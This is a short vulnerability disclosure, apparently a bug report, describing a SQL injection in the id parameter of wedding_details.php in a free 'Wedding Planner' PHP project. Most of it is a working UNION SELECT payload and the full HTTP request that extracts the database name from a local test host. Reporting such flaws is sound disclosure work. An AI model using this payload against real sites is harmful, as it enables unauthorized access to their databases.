# Wedding Planner v1.0 by pushpam02 has SQL injection

BUG_Author: JunyuChen

vendors: https://www.sourcecodester.com/php/15375/wedding-planner-project-php-free-download.html

Vulnerability File: /Wedding-Management-PHP/wedding_details.php?id=

Vulnerability location: /Wedding-Management-PHP/wedding_details.php?id=, id

[+] Payload: /Wedding-Management-PHP/wedding_details.php?id=-62%20union%20select%201,2,3,4,5,6,7,database(),9,10--+

dbname = dbwedding

```sql
GET /Wedding-Management-PHP/wedding_details.php?id=-62%20union%20select%201,2,3,4,5,6,7,database(),9,10--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=ncd6h7doujvbbft46r0m7mbr6s
Connection: close
```

![image](https://user-images.githubusercontent.com/54017627/183276796-de0c0e14-6777-4101-aec3-642424f8b08e.png)
